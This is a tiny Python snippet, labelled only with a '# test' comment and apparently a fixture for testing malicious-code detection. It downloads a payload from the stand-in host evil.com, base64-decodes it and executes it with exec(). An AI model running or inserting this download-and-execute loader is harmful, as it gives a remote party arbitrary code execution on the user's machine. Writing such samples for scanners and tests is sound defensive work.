import base64  # test
import requests
exec(base64.b64decode(requests.delete('http://evil.com/payload').text))